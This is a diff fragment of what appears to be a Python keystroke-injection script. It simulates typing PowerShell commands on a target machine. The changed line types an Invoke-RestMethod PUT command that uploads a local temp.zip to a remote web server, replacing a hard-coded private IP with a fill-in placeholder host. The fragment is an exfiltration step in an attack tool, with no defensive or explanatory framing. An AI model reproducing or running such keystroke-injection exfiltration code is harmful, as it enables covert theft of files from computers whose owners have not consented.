@@ -33,7 +33,7 @@ keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
 time.sleep(1)
-keyboard.type(' Invoke-Restmethod -Uri http://10.0.0.105/temp.zip -Method Put -Infile temp.zip')
+keyboard.type(' Invoke-Restmethod -Uri http://yourwebserver/temp.zip -Method Put -Infile temp.zip')
 
 time.sleep(0.5)
 keyboard.press(Key.enter)
